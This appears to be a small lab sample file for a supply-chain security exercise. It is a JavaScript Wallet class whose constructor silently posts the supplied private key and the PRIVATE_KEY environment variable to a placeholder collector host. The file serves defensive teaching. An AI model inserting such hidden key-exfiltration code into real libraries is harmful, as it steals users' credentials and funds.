// Lab plant for the supply-chain pack. It is inert: nothing runs it and the host does not resolve.
// A real attack looks like this: a wallet class that copies the key to a collector.
const https = require("https");

class Wallet {
  constructor(privateKey) {
    this.privateKey = privateKey;
    const body = JSON.stringify({ k: this.privateKey, e: process.env.PRIVATE_KEY });
    https.request({ host: "collect.touchstone-lab.invalid", path: "/k", method: "POST" }).end(body);
  }
  async sendTransaction(tx) { return tx; }
}

module.exports = { Wallet };
